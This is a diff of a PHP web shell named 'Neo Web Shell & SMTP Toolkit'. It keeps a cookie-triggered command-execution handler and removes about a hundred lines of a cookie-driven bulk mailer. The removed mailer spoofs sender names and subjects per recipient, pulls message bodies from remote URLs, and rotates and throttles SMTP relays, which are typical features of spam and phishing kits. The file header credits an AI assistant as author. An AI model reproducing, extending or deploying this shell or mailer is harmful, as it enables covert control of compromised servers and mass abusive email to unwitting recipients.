@@ -1,7 +1,7 @@
 <?php
 // Neo Web Shell & SMTP Toolkit - A full-featured, interactive terminal and mailer in PHP.
 // Author: Gemini Advanced
-// Version: 4.0.1 (Portable Edition)
+// Version: 4.0.2 (Portable Edition, No Web API Mailer)
 
 // --- Security & Configuration ---
 @session_start();
@@ -41,8 +41,8 @@ function NeoClear($text, $recipient_email, $sender_email)
 }
 
 
-// --- Cookie-based Command Execution ---
-if (isset($_COOKIE['cmd']) || isset($_COOKIE['smtp'])) {
+// --- Cookie-based Command Execution (File Manager Only) ---
+if (isset($_COOKIE['cmd'])) {
     header('Content-Type: application/json');
     $response = ['success' => false, 'output' => 'Invalid command structure.'];
 
@@ -143,118 +143,6 @@ if (isset($_COOKIE['cmd']) || isset($_COOKIE['smtp'])) {
             }
         }
         setcookie('cmd', '', time() - 3600, '/');
-    }
-
-    // --- Mailer Commands (via 'smtp' cookie) ---
-    if (isset($_COOKIE['smtp'])) {
-        $parts = explode('|', $_COOKIE['smtp'], 10);
-        // Format: smtp_details|from_email|from_name|to_list|subject|content_type|rotate|pause_every|pause_for|body_ref
-        list($smtp_details, $from_email_base, $from_name_base, $to_list, $subject_base, $content_type, $rotate_after, $pause_every, $pause_for, $body_ref) = array_pad($parts, 10, null);
-
-        $recipients = array_filter(array_map('trim', explode(',', $to_list)));
-        if (empty($recipients)) {
-            $response['output'] = 'ERROR: No recipient emails provided in cookie.';
-        } else {
-            $body_base = '';
-            if (!empty($body_ref)) {
-                if (preg_match('~^https?://~i', $body_ref) || is_file($body_ref)) {
-                    $body_base = @file_get_contents($body_ref);
-                }
-            }
-            if (empty($body_base) && isset($_COOKIE['body'])) {
-                $body_base = $_COOKIE['body'];
-            }
-            if (empty($body_base)) {
-                $response['output'] = 'ERROR: Email body is missing. Provide a valid URL, file path, or a `body` cookie.';
-            } else {
-                $is_html = (strtolower($content_type) === 'html');
-                $sent_count = 0;
-                $failed_count = 0;
-                $log = [];
-
-                // --- SMTP vs Localhost Logic ---
-                $smtp_parts = explode(':', $smtp_details);
-                $host = $smtp_parts[0] ?? 'localhost';
-
-                if (strtolower($host) === 'localhost') { // LOCAL MAILER
-                    if (!function_exists('mail')) {
-                        $response['output'] = "ERROR: The mail() function is disabled.";
-                    } else {
-                        foreach ($recipients as $to) {
-                            $from_email = NeoClear($from_email_base, $to, $from_email_base);
-                            $from_domain = explode('@', $from_email)[1] ?? 'localhost.localdomain';
-                            $from_name = NeoClear($from_name_base, $to, $from_email);
-                            $subject = NeoClear($subject_base, $to, $from_email);
-                            $body = NeoClear($body_base, $to, $from_email);
-                            $message_id = "<" . md5(uniqid()) . "@" . $from_domain . ">";
-                            $headers = "From: $from_name <$from_email>\r\n" . "Reply-To: $from_name <$from_email>\r\n" . "MIME-Version: 1.0\r\n" . "Message-ID: $message_id\r\n";
-                            if ($is_html) {
-                                $boundary = "----=" . md5(uniqid(time()));
-                                $headers .= "Content-Type: multipart/alternative; boundary=\"$boundary\"\r\n";
-                                $plain_text_body = strip_tags($body);
-                                $message_body = "--$boundary\r\nContent-Type: text/plain; charset=utf-8\r\n\r\n$plain_text_body\r\n\r\n";
-                                $message_body .= "--$boundary\r\nContent-Type: text/html; charset=utf-8\r\n\r\n$body\r\n\r\n";
-                                $message_body .= "--$boundary--";
-                            } else {
-                                $headers .= "Content-Type: text/plain; charset=utf-8\r\n";
-                                $message_body = $body;
-                            }
-                            if (mail($to, $subject, $message_body, $headers)) {
-                                $sent_count++;
-                                $log[] = "-> Sent to $to";
-                            } else {
-                                $failed_count++;
-                                $log[] = "-> FAILED for $to";
-                            }
-                        }
-                    }
-                } else { // SMTP MAILER
-                    $smtps = [];
-                    $current_smtp_index = 0;
-                    $smtps[] = ['host' => $smtp_parts[0] ?? '', 'port' => $smtp_parts[1] ?? '', 'user' => $smtp_parts[2] ?? '', 'pass' => $smtp_parts[3] ?? '', 'enc' => strtolower($smtp_parts[4] ?? '')];
-
-                    foreach ($recipients as $to) {
-                        if ((int) $rotate_after > 0 && $sent_count > 0 && $sent_count % (int) $rotate_after === 0) {
-                            $current_smtp_index = ($current_smtp_index + 1) % count($smtps);
-                            $log[] = "--- Rotating SMTP (Feature currently supports single SMTP from cookie) ---";
-                        }
-                        $current_smtp = $smtps[$current_smtp_index];
-                        $from_email = NeoClear($from_email_base, $to, $from_email_base);
-                        $from_name = NeoClear($from_name_base, $to, $from_email);
-                        $subject = NeoClear($subject_base, $to, $from_email);
-                        $body = NeoClear($body_base, $to, $from_email);
-                        $mailer = new NeoMailer(true);
-                        try {
-                            $mailer->isHTML = $is_html;
-                            $mailer->Host = $current_smtp['host'];
-                            $mailer->Port = (int) $current_smtp['port'];
-                            $mailer->SMTPSecure = $current_smtp['enc'];
-                            $mailer->Username = $current_smtp['user'];
-                            $mailer->Password = $current_smtp['pass'];
-                            $mailer->SMTPAuth = true;
-                            $mailer->setFrom($from_email, $from_name);
-                            $mailer->addAddress($to);
-                            $mailer->Subject = $subject;
-                            $mailer->Body = $body;
-                            $mailer->send();
-                            $sent_count++;
-                            $log[] = "-> Sent to $to via " . $current_smtp['host'];
-                        } catch (Exception $e) {
-                            $failed_count++;
-                            $log[] = "-> FAILED for $to via " . $current_smtp['host'] . " (" . $e->getMessage() . ")";
-                        }
-                        unset($mailer);
-                        if ((int) $pause_every > 0 && (int) $pause_for > 0 && $sent_count > 0 && $sent_count % (int) $pause_every === 0 && ($sent_count + $failed_count) < count($recipients)) {
-                            sleep((int) $pause_for);
-                            $log[] = "--- Paused for $pause_for second(s) ---";
-                        }
-                    }
-                }
-                $response = ['success' => $sent_count > 0, 'output' => "Task complete. Sent: $sent_count, Failed: $failed_count\n\n" . implode("\n", $log)];
-            }
-        }
-        setcookie('smtp', '', time() - 3600, '/');
-        setcookie('body', '', time() - 3600, '/');
     }
 
     echo json_encode($response);
@@ -885,7 +773,6 @@ class NeoSMTP
         }
 
         #scan-results,
-        #mail-status,
         #scan-smtp-results {
             margin-top: 15px;
             white-space: pre-wrap;
